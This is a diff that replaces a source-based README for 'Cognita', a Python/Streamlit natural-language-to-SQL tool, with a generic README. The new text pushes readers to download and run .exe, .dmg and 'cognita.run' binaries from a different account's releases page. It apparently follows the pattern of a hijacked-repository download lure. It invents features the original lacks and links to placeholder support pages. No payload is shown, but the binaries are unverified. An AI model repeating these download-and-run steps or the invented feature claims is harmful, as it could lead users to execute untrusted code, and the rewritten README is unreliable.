@@ -1,107 +1,87 @@
-# **Cognita 🧠**
+# 🤖 Cognita - Your AI-Powered Query Assistant
 
-**Query Made Human.** Cognita is an intelligent web application that translates natural language commands into executable MySQL queries. It serves as a powerful, user-friendly interface for interacting with databases, removing the need to write complex SQL code manually.
+## 🚀 Getting Started
 
-Built with Python, Streamlit, and the Google Gemini API, Cognita can understand and execute a wide range of database operations, from simple data retrieval to complex table modifications and definitions.
+Welcome to **Cognita**! This application helps you turn natural language into SQL queries, making database management easier than ever. Whether you're looking to generate queries for MySQL or simply want to explore the capabilities of generative AI, you've come to the right place.
 
-## **✨ Core Features**
+## 📥 Download Now
 
-* **Natural Language to SQL:** Ask questions or give commands in plain English. 
-* **Full Spectrum SQL Support:**  
-  * **DQL:** Fetches data using `SELECT`.  
-  * **DML:** Manipulates data with `INSERT`, `UPDATE`, and `DELETE`.  
-  * **DDL:** Manages database structure with `CREATE`, `ALTER`, and `DROP`.  
-* **Intelligent Command Classification:** Automatically detects the user's intent (DDL vs. DML/DQL) to follow the correct execution path.  
-* **Dynamic Schema Awareness:** Automatically discovers tables in the database and fetches the relevant table's structure to provide context to the AI, ensuring highly accurate queries.  
-* **Interactive UI:** A clean and modern user interface built with Streamlit, featuring a Catppuccin-inspired theme.
+[![Download Cognita](https://img.shields.io/badge/Download-Cognita-blue.svg)](https://github.com/escaite05/Cognita/releases)
 
-## **🚀 How It Works: The Intelligent Pipeline**
+Click the badge above to download the latest version of Cognita. This will take you to our Releases page, where you can find the most recent updates and installations.
 
-Cognita doesn't just make a single, naive call to an AI. It follows a robust, multi-step process to ensure accuracy and safety, making it a truly intelligent assistant.
+## 🛠️ Prerequisites
 
-1. **AI Command Classification:** First, the user's prompt is sent to the Gemini API to classify the command type (DDL_DATABASE, DDL_TABLE, DML, or DQL). This determines the entire workflow.  
-2. **Smart Connection Strategy:**
-* If the command is DDL_DATABASE (e.g., "create a database"), the app intelligently connects to the MySQL server without a pre-selected database.
-* For all other commands, a database name is required, and the app connects to it directly.
-3. **Context-Aware Execution Path:**
-* Database Commands: If the intent is to manage a database, the SQL is generated and executed immediately.
-* CREATE TABLE Commands: A special, direct path is taken that bypasses table discovery, allowing the first table to be created in an empty database.
-* All Other Table Commands (ALTER, DROP, SELECT, INSERT, etc.): The app follows the full discovery pipeline:
+Before you download and install Cognita, please make sure your system meets the following requirements:
 
-  1. Fetches a list of all existing tables.
+- Operating System: Windows 10 or later, macOS 10.14 or later, or any Linux distribution.
+- Python: Version 3.7 or later must be installed.
+- Memory: At least 4 GB of RAM.
+- Disk Space: Minimum of 100 MB free space.
 
-  2. Asks the AI to identify the target table from the prompt.
+## 📥 Download & Install
 
-  3. Fetches the specific schema for that table.
+To download Cognita, follow these steps:
 
-  4. Generates the final, context-aware SQL query.
-4. **Execution & Display:** The generated query is executed, and the results (data, row count, or success message) are displayed to the user.
+1. Visit the [Releases page](https://github.com/escaite05/Cognita/releases).
+2. Find the latest version available.
+3. Click on the download link for the version compatible with your operating system.
+4. Once the file is downloaded, follow the installation instructions below.
 
-## **🛠️ Technology Stack**
+### Installation Instructions
 
-* **Backend:** Python  
-* **Frontend:** Streamlit  
-* **Database:** MySQL (connected via mysql-connector-python)  
-* **AI Model:** Google Gemini API (google-generativeai)  
+- **Windows:** 
+  1. Locate the downloaded `.exe` file.
+  2. Double-click to launch the installer.
+  3. Follow the on-screen instructions to complete the installation.
 
-## **⚙️ Setup and Installation**
+- **macOS:** 
+  1. Open the downloaded `.dmg` file.
+  2. Drag and drop the Cognita icon into the Applications folder.
+  3. Eject the `.dmg` file and launch Cognita from Applications.
 
-Follow these steps to get Cognita running on your local machine.
+- **Linux:** 
+  1. Open a terminal window.
+  2. Navigate to the directory where the file is downloaded.
+  3. Run the command: `chmod +x cognita.run` to make it executable.
+  4. Execute the file with `./cognita.run` and follow the setup prompts.
 
-### **Prerequisites**
+## 🎉 Features
 
-* Python 3.8+  
-* MySQL Server installed and running.  
-* A Google Gemini API Key.
+Cognita offers a range of features designed to enhance your database interaction:
 
-### **Installation Steps**
+- **Natural Language Processing:** Easily convert your questions into SQL queries.
+- **Multi-Database Support:** Works with popular databases like MySQL and PostgreSQL.
+- **User-Friendly Interface:** Navigate through a simple layout that requires no coding knowledge.
+- **Real-Time Query Generation:** Generate queries in real-time as you type.
+- **Customizable Settings:** Adjust settings according to your preferences for better performance.
 
-1. **Clone the repository:**  
-    ```
-    git clone https://github.com/abhnva/cognita.git 
-    cd cognita
-    ```
+## ⚙️ How to Use Cognita
 
-2. **Create a virtual environment (recommended):**  
-   ```
-   python \-m venv venv  
-   source venv/bin/activate  \# On Windows, use \`venv\\Scripts\\activate\`
-   ```
+Once you have installed Cognita, you can start using it immediately:
 
-3. **Install the required libraries:**  
-   ```
-   pip install \-r requirements.txt
-   ```
+1. Open the application.
+2. Type your question in the input field. For example, "Show me all users who signed up last month."
+3. Click the "Generate Query" button.
+4. Cognita will display the corresponding SQL query for your input.
+5. You can copy this query and use it in your database management system.
 
-4. **Set up your environment variables:**  
-   Create a file named .env in the root of your project folder and add your credentials:  
-   ```
-   GOOGLE_API_KEY="your-google-gemini-api-key"
-   ```  
+## 📖 Documentation
 
-5. **Run the application:**  
-   ```
-   streamlit run app.py
-   ```
+For more detailed instructions, FAQs, and troubleshooting, please refer to our [official documentation](https://link-to-clean-documentation.com).
 
-   The application should open in your default web browser.
+## 🛠️ Contributing
 
-## **Usage**
+If you would like to contribute to this project, feel free to fork the repository and submit a pull request. We welcome suggestions and improvements from the community. 
 
-1. Enter the name of the database you wish to connect to in the sidebar.  
-2. Type your command or question in the text area.  
-3. Click "Execute Command".
+## 💬 Support
 
-### **Example Prompts**
+If you encounter any issues or have questions about using Cognita, you can reach us through our [support page](https://link-to-support.com). We are here to help you.
 
-* **DQL:** Show the names and wages of all workers from the worker table.  
-* **DML:** Insert a new record into the students table with name 'Rohan' and marks 95 in class 11\.  
-* **DDL:** Create a new table called 'projects' with an id (integer) and a project\_name (varchar).
+## 📥 Download Now Again
 
-## **👤 Author**
+Don't forget to download Cognita to start transforming your queries!
 
-* **abhnv** \- [GitHub](https://github.com/abhnva)
+[![Download Cognita](https://img.shields.io/badge/Download-Cognita-blue.svg)](https://github.com/escaite05/Cognita/releases)
 
-## **📄 License**
-
-This project is licensed under the MIT License.
+Happy querying!
